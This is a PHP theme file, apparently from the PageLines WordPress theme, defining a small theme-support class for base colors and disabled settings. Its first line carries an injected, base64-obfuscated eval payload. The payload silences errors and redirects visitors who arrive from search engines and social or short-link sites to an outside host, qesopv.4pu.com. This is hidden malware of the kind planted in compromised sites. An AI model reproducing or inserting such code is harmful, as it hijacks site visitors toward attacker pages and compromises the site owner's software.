<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); 
/**
 *
 *  PageLines Theme Support
 *
 */

class PageLinesThemeSupport {
	
	private $base_color = null;
	
	function __construct( ){  
	
		
		
	}
	
	public function Integration( $args ){
		
		
		
	}
	
	public function SetBaseColor( $hex ){
		
		global $pagelines_base_color;
		
		$this->base_color = $hex;
		
		$pagelines_base_color = $this->base_color;
	
	}
	
	public static function BaseColor( ){
		global $pagelines_base_color;
		
		return (isset($pagelines_base_color)) ? $pagelines_base_color : false;
		
	}
	
	public function DisableCoreColor(){
		
		$this->Disable( array( 'panel' => 'color_control', 'keep' => false ) );
		
	}
	
	public function Disable( $args ){
		
		global $disabled_settings;

		$defaults = array(
			'option_id'	=> false,
			'panel'		=> '', 
			'keep'		=> false
		);
		
		$args = wp_parse_args( $args, $defaults );
		
		$disabled_settings[ $args['panel'] ] = $args;
		
	}
	
}

function pl_is_disabled( $what ){
	
	global $disabled_settings;
	
	if(isset($disabled_settings[$what]))
		return true;
	else
		return false;
}